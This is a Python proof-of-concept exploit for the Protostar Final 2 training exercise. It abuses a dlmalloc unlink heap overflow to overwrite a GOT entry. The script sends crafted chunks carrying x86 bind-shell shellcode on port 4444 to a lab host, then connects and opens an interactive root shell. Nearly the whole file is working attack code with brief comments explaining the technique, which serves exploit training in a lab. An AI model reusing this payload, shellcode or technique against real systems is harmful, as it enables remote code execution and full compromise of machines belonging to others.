import socket
import struct
import time

# This is PoC of Final 0x2 Exploit-Exercises ProToStar.
# This challenge is vulnerable by Dllmalloc unlink.
# The Program searching for 'ROOT' and then '/' Before The ROOT.
# Writes The Data after the last '/' in payload and write it right after the first '/'
# Example : AAAA/ROOT/BBBB will become AAAA/BBBB
# So If we dont put / before ROOT it will keep going till it finds one, Even before the relative Chunk..
# Which mean we can overwrrite The Heap MetaData, And Since This Version is Vulnerable to Dllmalloc unlink.
# OWNED.

 
SIZE = 128

# Where our ShellCode Laies:
HeapAddr = struct.pack("I" , 0x0804e014)
# Write's GOT Addr - 0xc
WritAddr = struct.pack("I" , 0x0804d410)
# Size of Faking Chunks.
HeadSize = struct.pack("I" , 0xfffffffc)

# Shellcode opens port on 4444.
Shellcode =  "\x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89"
Shellcode += "\xe1\xcd\x80\x89\xc6\x31\xd2\x52\x66\x68\x11\x5c\x66"
Shellcode += "\x6a\x02\x89\xe1\xb0\x66\xb3\x02\x6a\x10\x51\x56\x89"
Shellcode += "\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80"
Shellcode += "\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
Shellcode += "\x31\xc9\xb1\x03\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\xb0"
Shellcode += "\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
Shellcode += "\xe3\x52\x53\x89\xe1\xcd\x80"

# Connection to the Server.
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.9" , 2993))

# The payload must contian FSRD or it will exit.
MustWord = 'FSRD'
NopSlide_Length = (125 -( len(MustWord) + len("/ROOT/") + len(Shellcode)))
NopSlide = '\x90' * (NopSlide_Length - 1)
FirstChunk = MustWord +  '/ROOT/' + NopSlide  + Shellcode
# The Last Byte is / so we will overwrite with the second chunk the Second Chunk Heap MetaData
Padding = 'AAA/'
FirstChunk += Padding

print '[+] Sending First Chunk'
s.send(FirstChunk)
time.sleep(2)

print '[+] Generating The Malicious Chunk'
# The Malicious Chunk, MustWord + ROOT/ so it wont exit, Fake Addrs * 2 + Address. + Padding to complete to 128
SecondChunk = MustWord + 'ROOT/' +HeadSize + HeadSize + WritAddr + HeapAddr + 'D' * 128
SecondChunk = SecondChunk[:128]

print '[+] Sending Malicious Chunk'
s.send(SecondChunk)
time.sleep(2)

print '[-] Closing connection...'
s.close()

# Connecting to the server as ROOT.
Shell = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Shell.connect(("10.0.0.9", 4444))
Shell.send("whoami\n")
data =  Shell.recv(999)

if data == "root\n":
	print "[+] OWNED !"
else:
	print "[-] FAILED !"

while True:
	cmd = raw_input("# ")
	Shell.send(cmd+'\n')
	print Shell.recv(999)

